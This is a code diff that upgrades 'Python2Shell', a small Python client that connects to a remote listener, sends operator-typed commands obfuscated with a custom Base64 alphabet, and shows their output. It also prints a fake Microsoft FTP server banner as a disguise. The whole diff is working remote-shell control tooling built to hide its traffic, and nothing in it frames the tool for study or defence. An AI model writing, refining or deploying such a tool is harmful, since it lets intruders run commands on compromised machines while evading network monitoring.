@@ -1,8 +1,11 @@
-# Python2Shell v0.1 (LiquidSky)
+#!/usr/bin/env python3
 
+# Python2Shell v0.2 (LiquidSky)
 import socket
+import argparse
+import sys
 
-# Custom Base64 encoding function (same as before)
+# Custom Base64 encoding function
 CUSTOM_ALPHABET = "~!@#$%^&*()_+=-0987654321`:;'{jKlMnOpQrStUvWxYzaBcDeFgHi,.<>?[]}"
 CUSTOM_ALPHABET_MAP = {char: idx for idx, char in enumerate(CUSTOM_ALPHABET)}
 
@@ -18,48 +21,52 @@ def custom_base64_encode(data: bytes) -> str:
         encoded += '#'
     return encoded
 
-# Server details
-HOST = '192.168.1.67'  # The IP of the listener.
-PORT = 446              # The same port as listener.
+def print_banner():
+    print("220 Microsoft FTP Server on Windows NT\n")
 
-# Create the socket connection
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-try:
-    s.connect((HOST, PORT))
-    print("220 Microsoft FTP Server on Windows NT \n")
-except Exception as e:
-    print(f"Error connecting to server: {e}")
-    exit()
+def main():
+    parser = argparse.ArgumentParser(
+        description="Python2Shell v0.2 - Sends custom Base64 encoded commands to a listener",
+        epilog="Example: python2shell.py -i 127.0.0.1 -p 446"
+    )
+    parser.add_argument("-i", "--ip", required=True, help="Target IP address of the listener")
+    parser.add_argument("-p", "--port", type=int, required=True, help="Target port of the listener")
+    args = parser.parse_args()
 
-while True:
+    # Connect to listener
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
-        # Get command from the user (mimicking a command prompt)
-        command = input(f"{HOST}> ")
+        s.connect((args.ip, args.port))
+        print_banner()
+    except Exception as e:
+        print(f"[!] Error connecting to server: {e}")
+        sys.exit(1)
 
-        # Send the custom Base64 encoded exit command if user types 'exit' or 'quit'
-        if command.lower() in ['exit', 'quit']:
-            encoded_command = custom_base64_encode(command.encode('utf-8'))
-            s.send(encoded_command.encode('utf-8'))
-            print("[*] Closing connection.")
+    while True:
+        try:
+            command = input(f"{args.ip}> ")
+
+            if command.lower() in ['exit', 'quit']:
+                encoded = custom_base64_encode(command.encode('utf-8'))
+                s.send(encoded.encode('utf-8'))
+                print("[*] Closing connection.")
+                break
+
+            encoded = custom_base64_encode(command.encode('utf-8'))
+            print(f"[*] Sending Encoded Command: {encoded}")
+            s.send(encoded.encode('utf-8'))
+
+            response = s.recv(1024).decode('utf-8')
+            print(f"[*] Command Output: {response}")
+
+        except BrokenPipeError:
+            print("[*] Server closed the connection. Exiting.")
+            break
+        except Exception as e:
+            print(f"[!] Error: {e}")
             break
 
-        # Base64 encode the command using custom alphabet
-        encoded_command = custom_base64_encode(command.encode('utf-8'))
-        print(f"[*] Sending Encoded Command: {encoded_command}")
+    s.close()
 
-        # Send the encoded command
-        s.send(encoded_command.encode('utf-8'))
-
-        # Receive and display the output
-        output = s.recv(1024).decode('utf-8')
-        print(f"[*] Command Output: {output}")
-        
-    except BrokenPipeError:
-        print("[*] Server closed the connection. Exiting.")
-        break
-    except Exception as e:
-        print(f"Error: {e}")
-        break
-
-# Close the connection
-s.close()
+if __name__ == "__main__":
+    main()
